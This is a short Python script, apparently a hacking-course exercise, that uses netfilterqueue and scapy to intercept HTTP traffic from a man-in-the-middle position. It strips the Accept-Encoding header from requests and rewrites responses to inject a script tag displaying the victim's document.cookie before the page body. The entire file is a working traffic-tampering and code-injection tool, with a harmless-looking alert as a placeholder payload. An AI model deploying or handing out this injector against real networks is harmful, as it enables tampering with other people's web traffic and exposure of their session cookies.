#!/usr/bin/ebv python

import netfilterqueue
import scapy.all as scapy
import re
ack_list =[]

def modify_load(scapy_packet, load):
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return scapy_packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        origin_load = scapy_packet[scapy.Raw].load
        load= origin_load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request type  HTTP ")
            load= re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)
            scapy_packet = modify_load(scapy_packet, load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response type HTTP ")
            load = re.sub("<body ", "<script>alert('hacked!!! '+document.cookie);</script> <body", scapy_packet[scapy.Raw].load)
            scapy_packet= modify_load(scapy_packet, load)

        if origin_load != load:
            print(scapy_packet)
            packet.set_payload(str(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()